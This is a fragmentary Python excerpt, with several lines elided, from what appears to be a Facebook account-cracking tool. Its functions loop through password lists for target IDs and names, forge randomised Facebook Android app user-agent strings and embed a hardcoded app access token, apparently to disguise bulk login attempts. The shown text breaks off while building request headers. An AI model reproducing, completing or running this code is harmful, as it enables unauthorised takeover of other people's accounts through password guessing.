...
def api2(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/11.0.0.9384;FBBV/7887780;FBDM/{density=.,width=720,height=1280};FBLC/en_US;FBRV/1388747;FBCR/null;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.lite;FBDV/Y12s;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
...
def api3(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/87.0.0.1620;FBBV/3050283;FBDM/{density=.,width=720,height=1280};FBLC/en_US;FBRV/8621731;FBCR/null;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.adsmanager;FBDV/Y12s;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
